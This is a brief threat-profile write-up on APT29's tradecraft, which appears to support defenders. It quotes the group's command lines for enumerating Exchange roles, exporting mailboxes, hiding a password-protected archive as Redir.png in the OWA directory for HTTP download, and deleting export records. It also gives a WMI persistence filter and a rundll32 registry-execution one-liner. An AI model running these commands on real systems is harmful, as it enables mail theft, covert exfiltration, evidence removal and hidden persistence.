# APT29

## Features

1. The organization will use PowerShell commands to obtain the list of users and current roles of the Exchange server during the intranet reconnaissance of the Exchange server.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv -NoTypeInformation | % {$_ -replace '`n','_'} | Out-File C:\temp\1.xml"
```

Check web service virtual directory information using PowerShell commands.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-WebServicesVirtualDirectory | Format-List"
```

PowerShell commands are also used when stealing e-mail files.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "New-MailboxExportRequest -Mailbox foobar@organization -ContentFilter {(Received -ge '03/01/2020')} -FilePath '\\<Mailbox server>\c$\temp\b.pst'"
```

Then the organization will use the 7Z compression program on the victim's OWA server to compress the file into an encrypted compressed package and access it through HTTP requests. After the execution is completed, the leaked data can be downloaded through the access request:/owa/auth/Redir.png.

```powershell
C:\Windows\system32\cmd.exe /C .\7z.exe a -mx9 -r0 -p[password]  "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Redir.png" C:\Temp\b.pst
```

After the end of email stealing, the organization will use PowerShell command to clear the export mail record.

```powershell
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-MailboxExportRequest -Mailbox user@organization | Remove-MailboxExportRequest -Confirm:$False"
```

2. Use WMI events for persistence during persistence.

```WMI
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime < 480
```

3. Utilize MSHTA persistence

```cmd
rundll32.exe vbscript:”..\mshtml,RunHTMLApplication “+Execute(CreateObject(“WScript.Shell”).RegRead(“HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot\”))(window.close)
//Read the registry first, then create the object, and use rundll32.exe to run
```
